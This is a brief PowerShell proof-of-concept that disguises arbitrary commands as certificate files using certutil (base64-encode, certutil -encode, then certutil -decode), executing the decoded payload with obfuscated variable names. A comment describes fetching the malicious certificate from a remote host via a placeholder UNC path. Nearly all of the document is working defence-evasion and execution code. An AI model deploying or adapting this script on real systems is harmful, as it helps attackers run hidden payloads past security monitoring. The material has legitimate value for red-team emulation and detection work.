# Proof-of-concept powershell script to emulate a Living Off the Land technique, using certutil to disguise malicious commands as certificates
# the -path input can be used to point to another powershell script to use as the payload
# Command/script is encoded into base64 and then encoded into a certificate using certutil, which is later decoded to execute
# This is a very basic and easy-to-detect implementation, but a cool proof of concept I wanted to play with

#Requires -RunAsAdministrator

[cmdLetBinding()]
param(
    $path
)

if(!$path) { $command = read-host -Prompt "Enter command to be obfuscated " } else { $command = (Get-Content $path).ToString() }
$bytes = [System.Text.Encoding]::UTF8.GetBytes($command)
$obfuscated = [convert]::ToBase64String($bytes) | Out-File -Force -FilePath "C:\test\raw.txt"

certutil.exe -f -encode C:\test\raw.txt C:\test\com.crt | Out-Null


# oneliner to execute, typically this would be reaching out to a remote server that hosts the malicious certificate
# Example usage certutil.exe -f -decode \\$ip\dir\to\cert.cer ..etc
certutil.exe -f -decode C:\test\com.crt C:\test\command.ps1 | Out-Null;$ihD8kR6kKYntm = (Get-Content -Path C:\test\command.ps1).ToString();$8PZ2mow8oX5L2o = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ihD8kR6kKYntm));& $8PZ2mow8oX5L2o

